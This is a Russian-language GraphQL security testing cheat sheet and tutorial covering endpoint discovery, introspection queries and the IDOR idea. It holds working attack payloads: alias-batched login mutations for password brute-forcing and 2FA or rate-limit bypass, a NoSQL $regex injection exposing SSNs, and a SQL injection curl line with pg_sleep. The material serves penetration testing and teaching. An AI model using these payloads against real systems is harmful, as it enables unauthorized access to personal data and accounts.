> GraphQL — это язык запросов для API и среда выполнения для выполнения этих запросов с использованием существующих данных, предназначенный для обеспечения эффективного взаимодействия между клиентами и серверами. Он позволяет пользователю точно указать, какие данные он хочет получить в ответе, что помогает избежать больших объектов ответа и множественных вызовов, которые иногда встречаются в REST API.

* [Инструменты](#инструменты)
* [Перечисление](#перечисление)
    * [Распространенные конечные точки GraphQL](#распространенные-конечные-точки-graphql)
    * [Идентификация точки внедрения](#идентификация-точки-внедрения)
    * [Перечисление схемы базы данных через интроспекцию](#перечисление-схемы-базы-данных-через-интроспекцию)
    * [Перечисление схемы базы данных через подсказки](#перечисление-схемы-базы-данных-через-подсказки)
    * [Перечисление определений типов](#перечисление-определений-типов)
    * [Список путей для достижения типа](#список-путей-для-достижения-типа)
* [Методология](#методология)
    * [Извлечение данных](#извлечение-данных)
    * [Извлечение данных с использованием Edges/Nodes](#извлечение-данных-с-использованием-edgesnodes)
    * [Извлечение данных с использованием проекций](#извлечение-данных-с-использованием-проекций)
    * [Мутации](#мутации)
    * [Атаки пакетной обработки GraphQL](#атаки-пакетной-обработки-graphql)
        * [Пакетная обработка на основе списка JSON](#пакетная-обработка-на-основе-списка-json)
        * [Пакетная обработка на основе имени запроса](#пакетная-обработка-на-основе-имени-запроса)
* [Внедрения](#внедрения)
    * [NoSQL Injection](#nosql-injection)
    * [SQL Injection](#sql-injection)
* [Лабораторные работы](#лабораторные-работы)
* [Ссылки](#ссылки)

# Инструменты

*   [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Скриптовый движок для взаимодействия с graphql endpoint в целях тестирования на проникновение.
*   [doyensec/graph-ql](https://github.com/doyensec/graph-ql) - Материалы для исследования безопасности GraphQL.
*   [doyensec/inql](https://github.com/doyensec/inql) - Расширение Burp для тестирования безопасности GraphQL.
*   [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - анализирует схему интроспекции GraphQL и генерирует возможные запросы.
*   [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Перечисляет различные способы достижения заданного типа в схеме GraphQL.
*   [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - Расширенная IDE для исследования GraphQL API.
*   [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Получение схемы GraphQL API, несмотря на отключенную интроспекцию.
*   [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - Утилита для перебора паролей и фаззинга GraphQL.
*   [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - Фреймворк угроз GraphQL, используемый специалистами по безопасности для исследования пробелов в безопасности в реализациях GraphQL.
*   [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Утилита для аудита безопасности GraphQL API.
*   [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - Утилита для определения движка сервера GraphQL.
*   [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Представляет любой GraphQL API в виде интерактивного графа.
*   [Insomnia](https://insomnia.rest/) - Кроссплатформенный HTTP и GraphQL клиент.

# Перечисление

### Распространенные конечные точки GraphQL

Чаще всего GraphQL находится по конечной точке `/graphql` или `/graphiql`. Более полный список доступен в [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt).

```url
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```


### Идентификация точки внедрения
```url
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

Проверьте, видны ли ошибки.
```url
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```


### Перечисление схемы базы данных через интроспекцию

URL-кодированный запрос для дампа схемы базы данных.

```python
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

Декодированный URL запрос для дампа схемы базы данных.

```graphql
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```
Однострочные запросы для дампа схемы базы данных без фрагментов.
```__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}```


```{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}```

### Перечисление схемы базы данных через подсказки

Когда вы используете неизвестное ключевое слово, бэкенд GraphQL ответит подсказкой, связанной с его схемой.
```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```
Вы также можете попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как Escape-Technologies/graphql-wordlist, когда схема GraphQL API недоступна.

### Перечисление определений типов

Перечислите определение интересующих типов, используя следующий запрос GraphQL, заменив "User" на выбранный тип.
```
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```
### Список путей для достижения типа
```bash
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

# Методология

## Извлечение данных
```
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

HTB Help - GraphQL injection

## Извлечение данных с использованием Edges/Nodes
```
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
}
```
## Извлечение данных с использованием проекций

⚠️ Не забудьте экранировать " внутри options.

```
{
  doctors(options: "{\"patients.ssn\" :1}") {
    firstName
    lastName
    id
    patients {
      ssn
    }
  }
}
```

## Мутации

Мутации работают как функции, вы можете использовать их для взаимодействия с GraphQL.
```
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

## Атаки пакетной обработки GraphQL

Распространенные сценарии:

    Усиление атаки перебора паролей

    Обход ограничения скорости (Rate Limit)

    Обход двухфакторной аутентификации (2FA)

### Пакетная обработка на основе списка JSON

> Пакетная обработка запросов (Query batching) — это функция GraphQL, которая позволяет отправлять несколько запросов на сервер в одном HTTP-запросе. Вместо отправки каждого запроса в отдельном запросе клиент может отправить массив запросов в одном POST-запросе на сервер GraphQL. Это уменьшает количество HTTP-запросов и может повысить производительность приложения.

Пакетная обработка запросов работает путем определения массива операций в теле запроса. Каждая операция может иметь свой собственный запрос, переменные и имя операции. Сервер обрабатывает каждую операцию в массиве и возвращает массив ответов, по одному для каждого запроса в пакете.
```
[
    {
        "query":"..."
    },
    {
        "query":"..."
    },
    {
        "query":"..."
    },
    {
        "query":"..."
    }
    ...
]
```
## Пакетная обработка на основе имени запроса
```
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```
Отправьте одну и ту же мутацию несколько раз, используя псевдонимы (aliases).
```
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```
# Внедрения

    Внедрения SQL и NoSQL все еще возможны, поскольку GraphQL — это всего лишь слой между клиентом и базой данных.

## NoSQL Injection

Используйте $regex внутри параметра поиска.
```
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}",
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }"
  ) {
    firstName
    lastName
    id
    patients {
      ssn
    }
  }
}
```

## SQL Injection

Отправьте одинарную кавычку ' внутри параметра GraphQL, чтобы вызвать SQL-инъекцию.
```
{
  bacon(id: "1'") {
    id
    type
    price
  }
}
```
Простая SQL-инъекция внутри поля GraphQL.
```
curl -X POST "http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27"
```


# Уязвимости GraphQL API

Уязвимости GraphQL обычно возникают из-за ошибок реализации и проектирования. Например, функция интроспекции может быть оставлена активной, что позволяет злоумышленникам отправлять запросы к API для получения информации о его схеме.

Атаки на GraphQL обычно представляют собой вредоносные запросы, которые могут позволить злоумышленнику получить данные или выполнить несанкционированные действия. Эти атаки могут иметь серьезные последствия, особенно если пользователь сможет получить права администратора, манипулируя запросами или выполняя CSRF-эксплойт. Уязвимые GraphQL API также могут приводить к раскрытию информации.

В этом разделе мы рассмотрим, как тестировать GraphQL API. Не беспокойтесь, если вы не знакомы с GraphQL — мы рассмотрим соответствующие детали по мере изучения. Мы также предоставили несколько лабораторных работ, чтобы вы могли попрактиковаться в изученном.

## Что такое GraphQL?

GraphQL — это язык запросов для API, предназначенный для обеспечения эффективного взаимодействия между клиентами и серверами. Он позволяет пользователю точно указать, какие данные он хочет получить в ответе, что помогает избежать больших объектов ответа и множественных вызовов, которые иногда встречаются в REST API.

Сервисы GraphQL определяют контракт, через который клиент может взаимодействовать с сервером. Клиенту не нужно знать, где находятся данные. Вместо этого клиенты отправляют запросы на сервер GraphQL, который извлекает данные из соответствующих мест. Поскольку GraphQL не зависит от платформы, он может быть реализован с использованием широкого спектра языков программирования и может использоваться для взаимодействия практически с любым хранилищем данных.

> Эта страница дает обзор того, что такое GraphQL и как он работает. Для получения конкретной информации о том, как тестировать уязвимости GraphQL, см. раздел «Уязвимости GraphQL API».

## Как работает GraphQL

Схемы GraphQL определяют структуру данных сервиса, перечисляя доступные объекты (известные как типы), поля и отношения.

Данные, описываемые схемой GraphQL, можно манипулировать с помощью трех типов операций:

*   **Запросы (Queries)** получают данные.
*   **Мутации (Mutations)** добавляют, изменяют или удаляют данные.
*   **Подписки (Subscriptions)** похожи на запросы, но устанавливают постоянное соединение, через которое сервер может активно передавать данные клиенту в указанном формате.

Все операции GraphQL используют одну и ту же конечную точку (endpoint) и обычно отправляются как POST-запрос. Это существенно отличается от REST API, которые используют специфичные для операции конечные точки и различные HTTP-методы. В GraphQL тип и имя операции определяют, как обрабатывается запрос, а не конечная точка, на которую он отправлен, или используемый HTTP-метод.

Сервисы GraphQL обычно отвечают на операции объектом JSON в запрошенной структуре.

### Что такое схема GraphQL?

В GraphQL схема представляет собой контракт между фронтендом и бэкендом сервиса. Она определяет доступные данные в виде набора типов, используя удобочитаемый язык определения схем (SDL). Эти типы затем могут быть реализованы сервисом.

Большинство определяемых типов — это объектные типы, которые определяют доступные объекты, их поля и аргументы. Каждое поле имеет свой собственный тип, который может быть другим объектом или скалярным типом, перечислением (enum), объединением (union), интерфейсом (interface) или пользовательским типом.

В приведенном ниже примере показано простое определение схемы для типа `Product`. Оператор `!` указывает, что поле является обязательным (non-nullable) при вызове.

```graphql
# Пример определения схемы
type Product {
    id: ID!
    name: String!
    description: String!
    price: Int
}
```

Схемы также должны включать как минимум один доступный запрос. Обычно они также содержат сведения о доступных мутациях.
Что такое запросы GraphQL?

Запросы GraphQL извлекают данные из хранилища данных. Они примерно эквивалентны GET-запросам в REST API.

Запросы обычно имеют следующие ключевые компоненты:

    Тип операции query. Технически это необязательно, но рекомендуется, так как явно сообщает серверу, что входящий запрос является запросом.

    Имя запроса. Это может быть любое удобное вам имя. Имя запроса необязательно, но рекомендуется, так как может помочь при отладке.

    Структура данных. Это данные, которые должен вернуть запрос.

    Опционально, один или несколько аргументов. Они используются для создания запросов, возвращающих сведения о конкретном объекте (например, «дай мне имя и описание продукта с ID 123»).

В примере ниже показан запрос с именем myGetProductQuery, который запрашивает поля name и description продукта с id, равным 123.
graphql

# Пример запроса
query myGetProductQuery {
    getProduct(id: 123) {
        name
        description
    }
}

Обратите внимание, что тип продукта может содержать в схеме больше полей, чем запрошено здесь. Возможность запрашивать только нужные данные является важной частью гибкости GraphQL.
Что такое мутации GraphQL?

Мутации изменяют данные каким-либо образом: добавляют, удаляют или редактируют их. Они примерно эквивалентны методам POST, PUT и DELETE в REST API.

Как и запросы, мутации имеют тип операции, имя и структуру для возвращаемых данных. Однако мутации всегда принимают входные данные (input) определенного типа. Это может быть встроенное значение, но на практике обычно предоставляется в виде переменной.

В примере ниже показана мутация для создания нового продукта и связанный с ней ответ. В этом случае сервис настроен так, чтобы автоматически назначать новый ID создаваемым продуктам, который был возвращен, как и запрошено.
graphql

# Пример запроса мутации
mutation {
    createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
        id
        name
        listed
    }
}

json

# Пример ответа на мутацию
{
    "data": {
        "createProduct": {
            "id": 123,
            "name": "Flamin' Cocktail Glasses",
            "listed": "yes"
        }
    }
}

Компоненты запросов и мутаций

Синтаксис GraphQL включает несколько общих компонентов для запросов и мутаций.
Поля (Fields)

Все типы GraphQL содержат элементы данных, доступные для запроса, называемые полями. Когда вы отправляете запрос или мутацию, вы указываете, какие поля должен вернуть API. Ответ зеркально отражает содержимое, указанное в запросе.

В примере ниже показан запрос на получение ID и имени всех сотрудников и связанный с ним ответ. В этом случае запрашиваются поля id, name.firstname и name.lastname.
graphql

# Запрос
query myGetEmployeeQuery {
    getEmployees {
        id
        name {
            firstname
            lastname
        }
    }
}

json

# Ответ
{
    "data": {
        "getEmployees": [
            {
                "id": 1,
                "name": {
                    "firstname": "Carlos",
                    "lastname": "Montoya"
                }
            },
            {
                "id": 2,
                "name": {
                    "firstname": "Peter",
                    "lastname": "Wiener"
                }
            }
        ]
    }
}

Аргументы (Arguments)

Аргументы — это значения, предоставляемые для конкретных полей. Аргументы, которые может принимать тип, определяются в схеме.

Когда вы отправляете запрос или мутацию, содержащую аргументы, сервер GraphQL определяет, как реагировать, на основе своей конфигурации. Например, он может вернуть конкретный объект вместо сведений обо всех объектах.

В примере ниже показан запрос getEmployee, который принимает ID сотрудника в качестве аргумента. В этом случае сервер отвечает только сведениями о сотруднике, который соответствует этому ID.
graphql

# Пример запроса с аргументами
query myGetEmployeeQuery {
    getEmployee(id:1) {
        name {
            firstname
            lastname
        }
    }
}

json

# Ответ на запрос
{
    "data": {
        "getEmployee": {
            "name": {
                "firstname": "Carlos",
                "lastname": "Montoya"
            }
        }
    }
}

    Если пользовательские аргументы используются для прямого доступа к объектам, то GraphQL API может быть уязвим для уязвимостей контроля доступа, таких как небезопасные прямые ссылки на объекты (IDOR).

Переменные (Variables)

Переменные позволяют передавать динамические аргументы, вместо того чтобы указывать аргументы непосредственно в самом запросе.

Запросы на основе переменных используют ту же структуру, что и запросы со встроенными аргументами, но некоторые аспекты запроса берутся из отдельного словаря переменных на основе JSON. Они позволяют повторно использовать общую структуру в нескольких запросах, меняя только значение самой переменной.

При построении запроса или мутации, использующей переменные, вам необходимо:

    Объявить переменную и ее тип.

    Добавить имя переменной в соответствующее место в запросе.

    Передать ключ переменной и значение из словаря переменных.

В примере ниже показан тот же запрос, что и в предыдущем примере, но с ID, переданным в качестве переменной, а не как непосредственная часть строки запроса.
graphql

# Пример запроса с переменной
query getEmployeeWithVariable($id: ID!) {
    getEmployee(id:$id) {
        name {
            firstname
            lastname
        }
     }
}

json

// Variables:
{
    "id": 1
}

В этом примере переменная объявляется в первой строке как ($id: ID!). ! указывает, что это обязательное поле для данного запроса. Затем она используется в качестве аргумента во второй строке как (id:$id). Наконец, значение самой переменной устанавливается в словаре переменных JSON.

Для получения информации о том, как тестировать эти уязвимости, см. раздел «Уязвимости GraphQL API».
Псевдонимы (Aliases)

Объекты GraphQL не могут содержать несколько свойств с одинаковым именем. Например, следующий запрос недействителен, потому что он пытается вернуть тип product дважды.
graphql

# Неверный запрос
query getProductDetails {
    getProduct(id: 1) {
        id
        name
    }
    getProduct(id: 2) {
        id
        name
    }
}

Псевдонимы позволяют обойти это ограничение, явно называя свойства, которые вы хотите вернуть из API. Вы можете использовать псевдонимы для возврата нескольких экземпляров одного и того же типа объекта в одном запросе. Это помогает сократить количество необходимых вызовов API.

В примере ниже запрос использует псевдонимы, чтобы указать уникальное имя для обоих продуктов. Теперь этот запрос проходит проверку, и детали возвращаются.
graphql

# Верный запрос с использованием псевдонимов
query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}

json

# Ответ на запрос
{
    "data": {
        "product1": {
            "id": 1,
            "name": "Juice Extractor"
         },
        "product2": {
            "id": 2,
            "name": "Fruit Overlays"
        }
    }
}

    Использование псевдонимов с мутациями фактически позволяет отправлять несколько сообщений GraphQL в одном HTTP-запросе.

Для получения дополнительной информации об использовании этой техники для обхода некоторых ограничений скорости см. раздел «Обход ограничения скорости с использованием псевдонимов».
Фрагменты (Fragments)

Фрагменты — это переиспользуемые части запросов или мутаций. Они содержат подмножество полей, принадлежащих связанному типу.

После определения их можно включать в запросы или мутации. Если они subsequently изменяются, это изменение включается в каждый запрос или мутацию, который вызывает фрагмент.

В примере ниже показан запрос getProduct, в котором детали продукта содержатся во фрагменте productInfo.
graphql

# Пример фрагмента
fragment productInfo on Product {
    id
    name
    listed
}

# Запрос, вызывающий фрагмент
query {
    getProduct(id: 1) {
        ...productInfo
        stock
    }
}

json

# Ответ, включающий поля фрагмента
{
    "data": {
        "getProduct": {
            "id": 1,
            "name": "Juice Extractor",
            "listed": "no",
            "stock": 5
        }
    }
}

Подписки (Subscriptions)

Подписки — это особый тип запроса. Они позволяют клиентам устанавливать длительное соединение с сервером, чтобы сервер мог затем proactively передавать клиенту обновления в реальном времени без необходимости постоянного опроса данных. Они в первую очередь полезны для небольших изменений в больших объектах и для функциональности, требующей небольших обновлений в реальном времени (например, чат-системы или совместное редактирование).

Как и обычные запросы и мутации, запрос подписки определяет форму возвращаемых данных.

Подписки обычно реализуются с использованием WebSockets.
Интроспекция (Introspection)

Интроспекция — это встроенная функция GraphQL, которая позволяет вам запрашивать у сервера информацию о схеме. Она обычно используется такими приложениями, как GraphQL IDE и инструменты генерации документации.

Как и обычные запросы, вы можете указать поля и структуру ответа, которые вы хотите получить. Например, вы можете захотеть, чтобы ответ содержал только имена доступных мутаций.

Интроспекция может представлять серьезный риск раскрытия информации, поскольку ее можно использовать для получения потенциально конфиденциальной информации (например, описаний полей) и помочь злоумышленнику узнать, как он может взаимодействовать с API. Наилучшей практикой является отключение интроспекции в производственных средах.
Поиск конечных точек GraphQL

Прежде чем вы сможете тестировать GraphQL API, вам сначала нужно найти его конечную точку. Поскольку GraphQL API используют одну и ту же конечную точку для всех запросов, это ценная информация.

    Этот раздел объясняет, как вручную исследовать конечные точки GraphQL. Однако Burp Scanner может автоматически тестировать конечные точки GraphQL в ходе своих сканирований. Он сообщает о проблеме «GraphQL endpoint found», если такие конечные точки обнаружены.

Универсальные запросы (Universal Queries)

Если вы отправите query{__typename} на любую конечную точку GraphQL, она будет включать строку {"data": {"__typename": "query"}} где-то в своем ответе. Это известно как универсальный запрос и является полезным инструментом для проверки, соответствует ли URL-адрес сервису GraphQL.

Запрос работает, потому что каждая конечная точка GraphQL имеет зарезервированное поле __typename, которое возвращает тип запрошенного объекта в виде строки.
Распространенные имена конечных точек

Сервисы GraphQL часто используют похожие суффиксы для конечных точек. При тестировании конечных точек GraphQL вам следует попытаться отправить универсальные запросы по следующим адресам:

    /graphql

    /api

    /api/graphql

    /graphql/api

    /graphql/graphql

Если эти распространенные конечные точки не возвращают ответ GraphQL, вы также можете попробовать добавить /v1 к пути.

    Сервисы GraphQL часто будут отвечать на любой не-GraphQL запрос ошибкой «query not present» или подобной. Вам следует помнить об этом при тестировании конечных точек GraphQL.

Методы запроса

Следующим шагом в попытке найти конечные точки GraphQL является тестирование с использованием различных методов запроса.

Наилучшей практикой для производственных конечных точек GraphQL является принимать только POST-запросы с content-type, равным application/json, так как это помогает защититься от уязвимостей CSRF. Однако некоторые конечные точки могут принимать альтернативные методы, такие как GET-запросы или POST-запросы, использующие content-type x-www-form-urlencoded.

Если вы не можете найти конечную точку GraphQL, отправляя POST-запросы на распространенные конечные точки, попробуйте повторно отправить универсальный запрос, используя альтернативные HTTP-методы.
Начальное тестирование

После того как вы обнаружили конечную точку, вы можете отправить несколько тестовых запросов, чтобы понять немного больше о том, как она работает. Если конечная точка используется для веб-сайта, попробуйте изучить веб-интерфейс в браузере Burp и используйте историю HTTP для изучения отправляемых запросов.
Использование несанитизированных аргументов

На этом этапе вы можете начать искать уязвимости. Тестирование аргументов запроса — хорошее место для начала.

Если API использует аргументы для прямого доступа к объектам, он может быть уязвим для уязвимостей контроля доступа. Пользователь потенциально может получить доступ к информации, к которой у него не должно быть доступа, просто предоставив аргумент, соответствующий этой информации. Это иногда называют небезопасной прямой ссылкой на объект (IDOR).
Дополнительная информация

    Для общего объяснения аргументов GraphQL см. раздел «Аргументы».

    Для получения дополнительной информации о IDOR см. «Небезопасные прямые ссылки на объекты (IDOR)».

Например, приведенный ниже запрос запрашивает список продуктов для интернет-магазина:
graphql

# Пример запроса продукта
query {
    products {
        id
        name
        listed
    }
}

Возвращаемый список продуктов содержит только listed (перечисленные) продукты.
json

# Пример ответа с продуктами
{
    "data": {
        "products": [
            {
                "id": 1,
                "name": "Product 1",
                "listed": true
            },
            {
                "id": 2,
                "name": "Product 2",
                "listed": true
            },
            {
                "id": 4,
                "name": "Product 4",
                "listed": true
            }
        ]
    }
}

Из этой информации мы можем сделать следующие выводы:

    Продуктам присваивается последовательный ID.

    Product ID 3 отсутствует в списке, возможно, потому что он был снят с публикации (delisted).

Запросив ID отсутствующего продукта, мы можем получить его данные, даже если он не указан в магазине и не был возвращен исходным запросом на список продуктов.
graphql

# Запрос на получение отсутствующего продукта
query {
    product(id: 3) {
        id
        name
        listed
    }
}

json

# Ответ с отсутствующим продуктом
{
    "data": {
        "product": {
            "id": 3,
            "name": "Product 3",
            "listed": false
        }
    }
}

Обнаружение информации о схеме

Следующим шагом в тестировании API является сбор информации о базовой схеме.

Лучший способ сделать это — использовать запросы интроспекции. Интроспекция — это встроенная функция GraphQL, которая позволяет вам запрашивать у сервера информацию о схеме.

Интроспекция помогает вам понять, как вы можете взаимодействовать с GraphQL API. Она также может раскрывать потенциально конфиденциальные данные, такие как поля описания.
Использование интроспекции

Чтобы использовать интроспекцию для получения информации о схеме, запросите поле __schema. Это поле доступно в корневом типе всех запросов.

Как и обычные запросы, вы можете указать поля и структуру ответа, которые вы хотите получить при выполнении запроса интроспекции. Например, вы можете захотеть, чтобы ответ содержал только имена доступных мутаций.

    Burp может генерировать запросы интроспекции за вас. Для получения дополнительной информации см. «Доступ к схемам GraphQL API с помощью интроспекции».

Проверка интроспекции

Наилучшей практикой является отключение интроспекции в производственных средах, но этому совету не всегда следуют.

Вы можете проверить наличие интроспекции, используя следующий простой запрос. Если интроспекция включена, ответ возвращает имена всех доступных запросов.
graphql

# Запрос проверки интроспекции
{
    "query": "{__schema{queryType{name}}}"
}

    Burp Scanner может автоматически тестировать интроспекцию во время сканирования. Если он обнаружит, что интроспекция включена, он сообщит о проблеме «GraphQL introspection enabled».

Выполнение полного запроса интроспекции

Следующим шагом является выполнение полного запроса интроспекции к конечной точке, чтобы вы могли получить как можно больше информации о базовой схеме.

Пример запроса ниже возвращает полные сведения обо всех запросах, мутациях, подписках, типах и фрагментах.
graphql

# Полный запрос интроспекции
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
            onOperation  # Часто требуется удалить для выполнения запроса
            onFragment   # Часто требуется удалить для выполнения запроса
            onField      # Часто требуется удалить для выполнения запроса
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}

